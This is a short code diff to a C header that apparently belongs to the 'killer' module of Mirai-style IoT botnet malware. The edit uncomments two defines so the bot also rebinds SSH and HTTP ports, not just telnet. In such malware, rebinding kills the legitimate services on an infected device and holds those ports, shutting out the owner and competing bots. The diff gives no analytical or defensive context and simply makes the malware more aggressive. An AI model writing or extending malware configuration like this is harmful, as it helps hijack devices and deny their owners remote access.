@@ -6,8 +6,8 @@
 #define KILLER_RESTART_SCAN_TIME    600
 
 #define KILLER_REBIND_TELNET
-// #define KILLER_REBIND_SSH
-// #define KILLER_REBIND_HTTP
+ #define KILLER_REBIND_SSH
+ #define KILLER_REBIND_HTTP
 
 void killer_init(void);
 void killer_kill(void);
